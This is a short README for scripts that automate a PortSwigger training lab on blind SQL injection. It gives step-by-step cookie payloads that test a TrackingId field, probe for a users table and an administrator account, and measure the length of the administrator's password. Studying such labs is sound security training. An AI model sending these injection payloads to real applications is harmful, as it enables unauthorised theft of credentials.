# Portswigger lab-11 automation scripts

## methodology
this lab has a blind SQL-injection vulnerability in the TrackingId cookie in the Cookie header

1. check the existence of blind SQL-injection by noticing that the response changed when we add a false condition as
`Cookie: TrackingId=someId' AND 1=2 --`
we will notice that the response won't have the "Welcome back" message, and as the lab description said it has users table and the target is to get the administrator password

2. check for the existance of the users table
`Cookie: TrackingId=someId' AND (SELECT 'a' FROM users LIMIT 1) = 'a' --` , we will notice that the condition is true as the response has the "welcome back" message

3. check the existence of the administrator user
`Cookie: TrackingId=someId' AND (SELECT username FROM users WHERE username = 'administrator') = 'administrator' --`
still getting the message then the administrator user exists

4. check the password length
`Cookie: TrackingId=someId' AND (SELECT 'a' FROM users WHERE LENGTH(password) > $length LIMIT 1) = 'a'  --`

5. After knowing the length of the administrator password, we should set it in the code

6. run the script for bash by `./script.sh` and for python with `python3 script.py`
